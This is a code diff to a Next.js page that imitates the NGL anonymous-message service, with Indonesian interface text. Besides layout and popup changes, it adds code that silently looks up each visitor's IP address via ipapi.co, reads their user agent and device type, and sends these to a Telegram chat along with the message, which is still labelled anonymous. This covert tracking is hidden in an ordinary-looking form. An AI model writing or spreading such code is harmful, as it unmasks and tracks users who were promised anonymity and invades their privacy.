@@ -1,10 +1,31 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import Head from "next/head";
 
 export default function NGLPage() {
   const [message, setMessage] = useState("");
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
+  const [userInfo, setUserInfo] = useState({
+    ip: "Tidak diketahui",
+    userAgent: navigator.userAgent,
+    device: "Tidak diketahui",
+  });
+
+  useEffect(() => {
+    // Ambil alamat IP pengguna
+    fetch("https://ipapi.co/json/")
+      .then((res) => res.json())
+      .then((data) => {
+        setUserInfo((prev) => ({
+          ...prev,
+          ip: data.ip,
+          device: data.device_type || "Tidak diketahui",
+        }));
+      })
+      .catch((err) => {
+        console.error("Error fetching IP info:", err);
+      });
+  }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -28,7 +49,7 @@ export default function NGLPage() {
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId,
-            text: `Pesan anonim dari ${username}: ${message}`,
+            text: `Pesan anonim dari\nIP: ${userInfo.ip}\nUSER AGENT: ${userInfo.userAgent}\nDEVICE: ${userInfo.device}\nPESAN: ${message}`,
           }),
         }
       );
@@ -44,6 +65,10 @@ export default function NGLPage() {
     } finally {
       setLoading(false);
     }
+  };
+
+  const closePopup = () => {
+    setSuccess(false);
   };
 
   return (
@@ -90,6 +115,9 @@ export default function NGLPage() {
             <div className="popup-content">
               <i className="fas fa-check-circle"></i>
               <p>Pesan berhasil dikirim!</p>
+              <button className="popup-close" onClick={closePopup}>
+                OK
+              </button>
             </div>
           </div>
         )}
@@ -106,8 +134,8 @@ export default function NGLPage() {
           font-family: Arial, sans-serif;
         }
         .container {
-          width: 100%;
-          max-width: 850px;
+          width: 90%;
+          max-width: 650px;
           padding: 20px;
           box-sizing: border-box;
           margin-top: 50px;
@@ -115,7 +143,7 @@ export default function NGLPage() {
         .profile-message-box {
           background: white;
           border-radius: 20px;
-          padding: 30px;
+          padding: 20px;
           box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
           width: 100%;
           box-sizing: border-box;
@@ -123,31 +151,31 @@ export default function NGLPage() {
         .profile {
           display: flex;
           align-items: center;
-          margin-bottom: 20px;
+          margin-bottom: 15px;
         }
         .profile img {
           border-radius: 50%;
-          width: 130px;
-          height: 130px;
-          margin-right: 15px;
+          width: 100px;
+          height: 100px;
+          margin-right: 10px;
         }
         .profile .username {
           font-weight: bold;
-          font-size: 40px;
+          font-size: 30px;
         }
         .profile .message {
-          margin-top: 2px;
-          font-size: 25px;
+          margin-top: 5px;
+          font-size: 18px;
           color: #555;
         }
         .message-box {
           background: rgba(128, 128, 128, 0.1);
           border-radius: 20px;
-          padding: 20px;
+          padding: 15px;
           color: rgba(0, 0, 0, 0.5);
-          font-size: 30px;
+          font-size: 16px;
           width: 100%;
-          height: 400px;
+          height: 150px;
           resize: none;
           border: none;
           outline: none;
@@ -156,8 +184,8 @@ export default function NGLPage() {
         .info {
           color: white;
           margin-bottom: 20px;
-          margin-top: 20px;
-          font-size: 30px;
+          margin-top: 10px;
+          font-size: 16px;
           justify-content: center;
           display: flex;
         }
@@ -169,11 +197,11 @@ export default function NGLPage() {
           color: white;
           border: none;
           border-radius: 20px;
-          padding: 20px 40px;
-          font-size: 40px;
+          padding: 15px 20px;
+          font-size: 18px;
           cursor: pointer;
           width: 100%;
-          height: 100px;
+          height: 50px;
           box-sizing: border-box;
           transition: background 0.3s ease;
         }
@@ -199,17 +227,30 @@ export default function NGLPage() {
           align-items: center;
           flex-direction: column;
           z-index: 1000;
-          animation: fadeIn 0.5s ease;
+          animation: fadeIn 0.3s ease;
         }
         .popup-content i {
-          font-size: 60px;
+          font-size: 50px;
           color: #4caf50;
         }
         .popup-content p {
-          margin: 10px 0 0;
-          font-size: 20px;
+          margin: 10px 0;
+          font-size: 16px;
           font-weight: bold;
           color: #333;
+        }
+        .popup-close {
+          background: #4caf50;
+          color: white;
+          border: none;
+          padding: 10px 20px;
+          border-radius: 10px;
+          font-size: 14px;
+          cursor: pointer;
+          margin-top: 15px;
+        }
+        .popup-close:hover {
+          background: #45a047;
         }
         @keyframes fadeIn {
           from {
